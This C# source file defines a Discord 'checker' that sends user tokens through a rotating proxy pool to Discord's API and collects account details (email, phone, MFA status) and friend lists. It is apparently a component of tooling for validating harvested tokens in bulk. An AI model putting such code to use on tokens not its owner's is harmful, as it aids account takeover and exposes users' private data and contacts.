using System.Net;
using System.Net.Http.Headers;
using System.Security.Authentication;
using Core.Models;
using Newtonsoft.Json;

namespace Core.Discord;

public static class DiscordChecker
{
    public static ProxyPool Proxy { get; set; } = new();
    
    public static async Task<DiscordAccount?> TryLoginAsync(string token)
    {
        var response = await _SendRequestAsync(token, "https://discord.com/api/v9/users/@me", HttpMethod.Get);

        if (response is not { StatusCode: HttpStatusCode.OK }) return null;

        var content = await response.Content.ReadAsStringAsync();

        if (string.IsNullOrEmpty(content)) return null;
        
        var account = JsonConvert.DeserializeObject<DiscordAccount>(content);
        
        if (account is not null) account.Token = token;
        
        return account;
    }

    public static async IAsyncEnumerable<DiscordFriend> Friends(string token)
    {
        var response = await _SendRequestAsync(token, "https://discord.com/api/v8/users/@me/relationships", HttpMethod.Get);
        
        if (response is not { StatusCode: HttpStatusCode.OK }) yield break;

        var content = await response.Content.ReadAsStringAsync();
        
        if (string.IsNullOrEmpty(content)) yield break;
        
        foreach (var friend in JsonConvert.DeserializeObject<List<DiscordFriend>>(content) ?? new List<DiscordFriend>())
        {
            yield return friend;
        }
    }

    private static async Task<HttpResponseMessage> _SendRequestAsync(string token, string url, HttpMethod method)
    {
        using var http = Proxy.TakeClient(new AuthenticationHeaderValue(token))!;

        var request = new HttpRequestMessage(method, url);
        var response = await http.SendAsync(request);
        
        return response;
    }
}

#pragma warning disable CS8618 // Non-nullable field must contain a non-null value when exiting constructor. Consider declaring as nullable.

public record DiscordFriend(
    [JsonProperty("id")] string Id,
    [JsonProperty("type")] int Type,
    [JsonProperty("nickname")] object Nickname,
    [JsonProperty("user")] DiscordAccount User,
    [JsonProperty("since")] DateTime Since
);

public class DiscordAccount
{
    public string Token { get; set; }
    [JsonProperty("id")] public string Id { get; set; }
    [JsonProperty("username")] public string Username { get; set; }
    [JsonProperty("avatar")] public string Avatar { get; set; }
    [JsonProperty("discriminator")] public string Discriminator { get; set; }
    [JsonProperty("public_flags")] public int PublicFlags { get; set; }
    [JsonProperty("premium_type")] public int PremiumType { get; set; }
    [JsonProperty("flags")] public int Flags { get; set; }
    [JsonProperty("banner")] public object Banner { get; set; }
    [JsonProperty("accent_color")] public int? AccentColor { get; set; }
    [JsonProperty("global_name")] public string GlobalName { get; set; }
    [JsonProperty("avatar_decoration_data")] public object AvatarDecorationData { get; set; }
    [JsonProperty("banner_color")] public string BannerColor { get; set; }
    [JsonProperty("mfa_enabled")] public bool MfaEnabled { get; set; }
    [JsonProperty("locale")] public string Locale { get; set; }
    [JsonProperty("email")] public string Email { get; set; }
    [JsonProperty("verified")] public bool Verified { get; set; }
    [JsonProperty("phone")] public string Phone { get; set; }
    [JsonProperty("nsfw_allowed")] public bool? NsfwAllowed { get; set; }
    [JsonProperty("linked_users")] public IReadOnlyList<object> LinkedUsers { get; set; }
    [JsonProperty("bio")] public string Bio { get; set; }
    [JsonProperty("authenticator_types")] public IReadOnlyList<object> AuthenticatorTypes { get; set; }
}